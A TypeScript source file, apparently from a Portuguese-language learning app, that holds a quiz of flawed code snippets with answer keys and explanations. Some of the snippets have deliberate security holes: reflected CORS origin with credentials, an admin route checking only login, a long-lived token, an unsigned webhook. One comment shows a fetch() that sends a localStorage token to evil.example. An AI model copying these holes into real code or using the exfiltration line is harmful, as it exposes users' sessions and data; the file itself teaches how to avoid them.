import type { ExemploCodigo } from "@/shared/types/conceito";

/**
 * Perguntas escritas à mão: código quebrado plausível → qual princípio?
 *
 * Diferente dos outros formatos do quiz, isto **não deriva** do catálogo —
 * errado demais é óbvio, errado de menos é injusto. Por isso vive num
 * registro próprio, no mesmo espírito de postmortems e comparações.
 */
export interface ExplicarErro {
  id: string;
  /** Trecho que viola o princípio — sem citar o nome dele. */
  codigo: ExemploCodigo;
  /**
   * Contexto em uma frase. Não pode nomear a resposta (o spec confere).
   * Se omitido, o enunciado é só o código.
   */
  enunciado?: string;
  /** Slug do conceito correto (tipicamente um princípio SOLID). */
  correta: string;
  /**
   * Distratores. Sem isto, usa os cinco SOLID (exceto a correta).
   * Útil quando a resposta não é SOLID (ex.: CQS, Deméter).
   */
  alternativas?: string[];
  /** Revelado depois — diz o princípio e o porquê. */
  explicacao: string;
}

const SOLID = ["srp", "ocp", "lsp", "isp", "dip"] as const;

export const EXPLICAR_ERROS: ExplicarErro[] = [
  {
    id: "srp-pedido-faz-tudo",
    correta: "srp",
    enunciado: "Três motivos diferentes para esta classe mudar.",
    codigo: {
      lang: "typescript",
      code: `class Pedido {
  itens: Item[] = [];
  total() { return this.itens.reduce((s, i) => s + i.preco * i.qtd, 0); }
  salvar() { db.insert("pedidos", this); }
  emitirNota() { fiscal.gerarXml(this); }
  enviarEmail() { mail.send(this.cliente, "pedido ok"); }
}`,
    },
    explicacao:
      "SRP — a classe mistura regra de negócio, persistência, fiscal e notificação. Cada interessado puxa uma mudança diferente.",
  },
  {
    id: "ocp-switch-pagamento",
    correta: "ocp",
    enunciado: "Cada meio de pagamento novo reabre esta função.",
    codigo: {
      lang: "typescript",
      code: `function cobrar(pedido: Pedido, meio: string) {
  if (meio === "cartao") return stripe.charge(pedido);
  if (meio === "pix") return pix.cobrar(pedido);
  if (meio === "boleto") return boleto.emitir(pedido);
  throw new Error("meio desconhecido");
}`,
    },
    explicacao:
      "OCP — acrescentar um meio exige editar a função. Aberto a extensão seria uma estratégia/plugin por meio, sem tocar no orquestrador.",
  },
  {
    id: "lsp-ave-nao-voa",
    correta: "lsp",
    enunciado: "O subtipo quebra a expectativa de quem usa o tipo base.",
    codigo: {
      lang: "typescript",
      code: `class Ave { voar() { /* sobe */ } }
class Pinguim extends Ave {
  voar() { throw new Error("pinguins nao voam"); }
}
function migrar(aves: Ave[]) {
  for (const a of aves) a.voar(); // explode com Pinguim
}`,
    },
    explicacao:
      "LSP — Pinguim não pode substituir Ave sem surpresa. Quem recebe Ave assume voar(); o subtipo viola o contrato.",
  },
  {
    id: "isp-worker-gordo",
    correta: "isp",
    enunciado: "A implementação é obrigada a fingir métodos que não usa.",
    codigo: {
      lang: "typescript",
      code: `interface Trabalhador {
  trabalhar(): void;
  comer(): void;
  dormir(): void;
}
class Robot implements Trabalhador {
  trabalhar() { /* ok */ }
  comer() { throw new Error("robos nao comem"); }
  dormir() { throw new Error("robos nao dormem"); }
}`,
    },
    explicacao:
      "ISP — a interface força Robot a conhecer comer/dormir. Interfaces menores (Trabalhavel) evitam métodos mortos e exceções de mentira.",
  },
  {
    id: "dip-servico-concreto",
    correta: "dip",
    enunciado: "O módulo de alto nível instancia o detalhe concreto.",
    codigo: {
      lang: "typescript",
      code: `class Notificador {
  avisar(msg: string) {
    const smtp = new SmtpClient("smtp.empresa.com");
    smtp.send(msg);
  }
}`,
    },
    explicacao:
      "DIP — Notificador depende de SmtpClient concreto. Deveria depender de uma abstração (PortaEmail) injetada; o SMTP fica na borda.",
  },
  {
    id: "cqs-get-com-efeito",
    correta: "cqs",
    alternativas: ["cqs", "srp", "command", "cqrs"],
    enunciado: "Um 'get' que também muda o mundo.",
    codigo: {
      lang: "typescript",
      code: `class Carrinho {
  getTotal(): number {
    this.itens = this.itens.filter((i) => i.qtd > 0); // efeito colateral
    return this.itens.reduce((s, i) => s + i.preco * i.qtd, 0);
  }
}`,
    },
    explicacao:
      "CQS — consulta não deveria mutar. Filtrar itens é comando; total() é pergunta. Misturar os dois torna o get imprevisível.",
  },
  {
    id: "demeter-trem-de-chamadas",
    correta: "lei-de-demeter",
    alternativas: [
      "lei-de-demeter",
      "facade",
      "srp",
      "dip",
    ],
    enunciado: "O cliente conhece a estrutura interna de três objetos.",
    codigo: {
      lang: "typescript",
      code: `function cidadeDoCliente(pedido: Pedido) {
  return pedido.getCliente().getEndereco().getCidade();
}`,
    },
    explicacao:
      "Lei de Deméter — pedido não deveria expor a cadeia interna. Peça a cidade ao pedido (ou a um método que encapsule o caminho).",
  },
  {
    id: "heranca-para-reuso",
    correta: "composicao-sobre-heranca",
    alternativas: [
      "composicao-sobre-heranca",
      "srp",
      "template-method",
      "decorator",
    ],
    enunciado: "Herança só para reaproveitar um pedaço de código.",
    codigo: {
      lang: "typescript",
      code: `class Logger {
  log(msg: string) { console.log(msg); }
}
class PedidoService extends Logger {
  criar() { this.log("criando"); /* ... */ }
}`,
    },
    explicacao:
      "Composição sobre herança — PedidoService não é um Logger; ele usa um. Estender só por reuso acopla o ciclo de vida e o tipo errado.",
  },
  {
    id: "token-no-local-storage",
    correta: "jwt",
    alternativas: ["jwt", "autenticacao", "autorizacao", "oauth2"],
    enunciado: "Depois do login, a prova fica onde o script da página alcança.",
    codigo: {
      lang: "typescript",
      code: `async function onLogin(res: Response) {
  const { accessToken } = await res.json();
  localStorage.setItem("accessToken", accessToken);
}
// Qualquer XSS na página faz:
// fetch("https://evil.example", { method:"POST", body: localStorage.getItem("accessToken") })`,
    },
    explicacao:
      "JWT (e tokens em geral) no localStorage são legíveis por XSS. Access curto em memória + refresh em cookie httpOnly (ou sessão clássica) reduz o que o script rouba.",
  },
  {
    id: "guard-so-tem-user",
    correta: "autorizacao",
    alternativas: ["autorizacao", "autenticacao", "jwt", "mfa"],
    enunciado: "A porta sensível só pergunta se alguém passou na catraca.",
    codigo: {
      lang: "typescript",
      code: `function requireAdmin(req: any, res: any, next: any) {
  if (!req.user) return res.status(401).end();
  next(); // qualquer conta logada apaga usuarios
}
app.delete("/admin/users/:id", requireAdmin, apagarUsuario);`,
    },
    explicacao:
      "Isso autentica, não autoriza. Falta checar role/permissão (e, em recursos por dono, o vínculo). 401 ≠ 403.",
  },
  {
    id: "cors-reflete-origin",
    correta: "allowlist",
    alternativas: ["allowlist", "autenticacao", "rate-limiting", "api-gateway"],
    enunciado: "A API ecoa de volta qualquer Origin do request.",
    codigo: {
      lang: "typescript",
      code: `app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", "true");
  }
  next();
});`,
    },
    explicacao:
      "Allowlist — só origens cadastradas. Refletir Origin + credentials entrega cookies de sessão a qualquer site que a vítima visite.",
  },
  {
    id: "refresh-eterno",
    correta: "jwt",
    alternativas: ["jwt", "autenticacao", "mfa", "oauth2"],
    enunciado: "O access vive meses e nunca é trocado.",
    codigo: {
      lang: "typescript",
      code: `function emitirAccess(userId: string) {
  return assinar(
    { sub: userId, iat: agora() },
    { expiresIn: "90d", alg: "HS256" }
  );
}
// sem refresh, sem denylist, sem revalidar roles`,
    },
    explicacao:
      "Access longo demais vira sessão roubável até o exp. Padrão moderno: access de minutos + refresh rotativo (de preferência httpOnly).",
  },
  {
    id: "webhook-sem-assinatura",
    correta: "autenticacao",
    alternativas: ["autenticacao", "allowlist", "webhooks", "gestao-de-segredos"],
    enunciado: "Qualquer POST na URL secreta é tratado como evento do parceiro.",
    codigo: {
      lang: "typescript",
      code: `app.post("/hooks/pagamento", async (req, res) => {
  await pedidos.baixar(req.body.pedidoId); // confia no body
  res.sendStatus(200);
});`,
    },
    explicacao:
      "Autenticação do webhook (HMAC/assinatura do provedor) prova que a mensagem veio dele. URL 'secreta' vaza; allowlist de IP ajuda, mas a assinatura é a prova.",
  },
];

/** Alternativas: no máximo 4 (grid 2×2 da UI). Default = SOLID. */
export function alternativasDe(item: ExplicarErro): string[] {
  if (item.alternativas?.length) {
    const pool = [...item.alternativas];
    if (!pool.includes(item.correta)) pool.unshift(item.correta);
    return pool.slice(0, 4);
  }
  const outros = SOLID.filter((s) => s !== item.correta);
  return [item.correta, ...outros].slice(0, 4);
}
